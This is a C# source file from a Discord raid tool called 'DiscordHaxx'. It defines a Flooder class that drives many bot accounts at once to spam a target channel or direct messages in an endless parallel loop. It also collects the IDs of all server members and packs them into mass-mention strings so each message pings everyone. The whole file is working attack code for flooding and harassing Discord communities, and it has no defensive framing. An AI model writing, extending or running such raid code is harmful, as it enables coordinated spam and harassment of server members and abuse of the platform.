using Discord;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace DiscordHaxx
{
    public class Flooder : RaidBot
    {
        private readonly FloodRequest _request;
        private readonly List<FloodClient> _clients;
        private List<string> _mentionChunks = null;
        private bool _ready;

        public Flooder(FloodRequest request)
        {
            Attack = new Attack(this) { Type = "Flooder", Bots = Server.Bots.Count };

            Threads = request.Threads;
            _request = request;

            if (!request.UseEmbed && !request.MassMention)
            {
                if (string.IsNullOrWhiteSpace(_request.Message))
                    throw new CheckException("Cannot send empty messages");
            }

            if (_request.ChannelId <= 0)
                throw new CheckException("Invalid channel ID");

            _clients = new List<FloodClient>();

            if (request.DM)
            {
                Task.Run(() =>
                {
                    foreach (var bot in new List<RaidBotClient>(Server.Bots))
                    {
                        if (ShouldStop)
                            break;

                        try
                        {
                            _clients.Add(new FloodClient(bot, request.ChannelId, true, request.Message));
                        }
                        catch { }
                    }

                    _ready = true;
                });
            }
            else
            {
                foreach (var bot in Server.Bots)
                    GenerateMemberChunks(bot);

                int i = 0;
                foreach (var bot in Server.Bots)
                {
                    string msg = _request.Message;

                    if (_mentionChunks != null)
                    {
                        if (i >= _mentionChunks.Count)
                            i = 0;

                        msg += _mentionChunks[i];

                        i++;
                    }

                    _clients.Add(new FloodClient(bot, request.ChannelId, false, msg));
                }
                _ready = true;
            }
        }


        public override void Start()
        {
            while (!_ready) { Thread.Sleep(1); }

            while (true)
            {
                if (ShouldStop)
                    break;

                Parallel.ForEach(new List<FloodClient>(_clients), new ParallelOptions() { MaxDegreeOfParallelism = _request.Threads }, bot =>
                {
                    if (ShouldStop)
                        return;

                    if (!bot.TrySendMessage(_request.UseEmbed ? _request.Embed : null))
                        _clients.Remove(bot);
                });


                if (_clients.Count == 0)
                    break;
            }

            Server.OngoingAttacks.Remove(Attack);
        }


        private void GenerateMemberChunks(RaidBotClient bot)
        {
            if (_request.MassMention && bot.SocketClient && _mentionChunks == null)
            {
                try
                {
                    GuildChannel channel = bot.Client.GetGuildChannel(_request.ChannelId);

                    List<GuildMember> members = bot.Client.GetAllGuildMembers(channel.GuildId).Where(m => Server.Bots.Where(b => b.Client.User.Id == m.User.Id).Count() == 0).ToList();

                    _mentionChunks = new List<string>();

                    int i = 0;
                    while (i < members.Count)
                    {
                        StringBuilder builder = new StringBuilder();

                        while (true)
                        {
                            if (i >= members.Count)
                                break;

                            if (builder.Length + $"<@{members[i].User.Id}>".Length < 2000 - _request.Message.Length)
                            {
                                builder.Append($"<@{members[i].User.Id}>");
                                i++;
                            }
                            else
                                break;
                        }

                        _mentionChunks.Add(builder.ToString());
                    }
                }
                catch { }
            }
        }
    }
}
